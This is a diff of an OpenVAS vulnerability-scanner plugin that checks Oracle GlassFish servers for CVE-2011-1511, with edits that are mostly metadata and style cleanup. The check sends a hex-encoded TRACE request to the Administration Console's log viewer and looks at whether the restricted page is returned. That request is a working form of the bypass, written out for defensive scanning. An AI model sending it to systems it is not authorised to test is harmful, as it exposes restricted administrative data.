@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_oracle_glassfish_sec_bypass_vuln.nasl 7006 2017-08-25 11:51:20Z teissa $
+# $Id: gb_oracle_glassfish_sec_bypass_vuln.nasl 10317 2018-06-25 14:09:46Z cfischer $
 #
 # Oracle Java GlassFish Server Security Bypass Vulnerability
 #
@@ -27,35 +27,39 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.801939");
-  script_version("$Revision: 7006 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-08-25 13:51:20 +0200 (Fri, 25 Aug 2017) $");
+  script_version("$Revision: 10317 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-06-25 16:09:46 +0200 (Mon, 25 Jun 2018) $");
   script_tag(name:"creation_date", value:"2011-05-26 10:47:46 +0200 (Thu, 26 May 2011)");
   script_cve_id("CVE-2011-1511");
   script_tag(name:"cvss_base", value:"6.4");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
   script_name("Oracle Java GlassFish Server Security Bypass Vulnerability");
-
-  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2011/May/296");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101343/CORE-2010-1118.txt");
-
   script_category(ACT_ATTACK);
   script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
-  script_family("General");
+  script_family("Web Servers");
   script_dependencies("find_service.nasl", "http_version.nasl");
   script_require_ports("Services/www", 4848);
+  script_exclude_keys("Settings/disable_cgi_scanning");
 
-  script_tag(name : "impact" , value : "Successful exploitation could allow local attackers to access sensitive data
+  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2011/May/296");
+  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101343/CORE-2010-1118.txt");
+
+  script_tag(name:"impact", value:"Successful exploitation could allow local attackers to access sensitive data
   on the server without being authenticated, by making 'TRACE' requests against
   the Administration Console.
+
   Impact Level: System/Application");
-  script_tag(name : "affected" , value : "Oracle GlassFish version 3.0.1 and
+
+  script_tag(name:"affected", value:"Oracle GlassFish version 3.0.1 and
   Sun GlassFish Enterprise Server 2.1.1");
-  script_tag(name : "insight" , value : "The flaw is due to an error in Administration Console, when handling
+
+  script_tag(name:"insight", value:"The flaw is due to an error in Administration Console, when handling
   HTTP requests using the 'TRACE' method. A remote unauthenticated attacker can
   get access to the content of restricted pages in the Administration Console.");
-  script_tag(name : "solution" , value : "Apply the security updates or Upgrade to Oracle GlassFish 3.1
+  script_tag(name:"solution", value:"Apply the security updates or Upgrade to Oracle GlassFish 3.1
   http://packetstormsecurity.org/files/view/101343/CORE-2010-1118.txt");
-  script_tag(name : "summary" , value : "The host is running Oracle GlassFish Server and is prone to
+
+  script_tag(name:"summary", value:"The host is running Oracle GlassFish Server and is prone to
   security bypass vulnerability.");
 
   script_tag(name:"solution_type", value:"VendorFix");
@@ -64,27 +68,20 @@ if(description)
   exit(0);
 }
 
-
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Check for the default port
 port = get_http_port(default:4848);
-
 rcvRes = http_get_cache(item:"/", port:port);
 
-## Confirm the server
-if("Sun Java System Application Server" ><  rcvRes || "GlassFish Server" >< rcvRes)
-{
+if("Sun Java System Application Server" >< rcvRes || "GlassFish Server" >< rcvRes){
+
+  host = get_host_name();
   soc = open_sock_tcp(port);
   if(!soc){
     exit(0);
   }
 
-  ## Get the host name
-  host = get_host_name();
-  
-  ## Construct the attack request
   data = raw_string (0x54, 0x52, 0x41, 0x43, 0x45, 0x20, 0x2f, 0x63,
                      0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2f, 0x6c, 0x6f,
                      0x67, 0x56, 0x69, 0x65, 0x77, 0x65, 0x72, 0x2f,
@@ -103,9 +100,8 @@ if("Sun Java System Application Server" ><  rcvRes || "GlassFish Server" >< rcvR
   send(socket:soc, data:data);
   rcv = recv(socket:soc, length:1024);
 
-  ## Check the Response
   if("<title>Log Viewer</title>" >< rcv && "405 TRACE method is not allowed" >!< rcv){
-    security_message(port);
+    security_message(port:port);
     exit(0);
   }
 }
